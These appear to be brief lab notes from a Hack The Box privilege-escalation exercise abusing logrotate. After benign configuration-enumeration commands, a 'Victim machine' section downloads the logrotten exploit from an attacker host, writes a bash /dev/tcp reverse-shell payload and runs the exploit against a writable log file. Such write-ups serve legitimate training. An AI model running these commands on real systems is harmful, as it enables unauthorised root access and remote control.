...
```shell-session
xF1NN@htb[/htb]$ man logrotate
xF1NN@htb[/htb]$ # or
xF1NN@htb[/htb]$ logrotate --help
...
```shell-session
xF1NN@htb[/htb]$ cat /etc/logrotate.conf
...
```shell-session
xF1NN@htb[/htb]$ sudo cat /var/lib/logrotate.status
...
```shell-session
xF1NN@htb[/htb]$ ls /etc/logrotate.d/
...
```shell-session
xF1NN@htb[/htb]$ cat /etc/logrotate.d/dpkg
...
**Victim machine**
wget -r PWNIP:8000/logrotten
echo 'bash -i >& /dev/tcp/PWNIP/4444 0>&1' > payload
gcc logrotten.c -o logrotten
Find log you can write to **/home/htb-student/backups/access.log**
./logrotten -p ./payload /home/htb-student/backups/access.log
echo ' aaa ' > /home/htb-student/backups/access.log
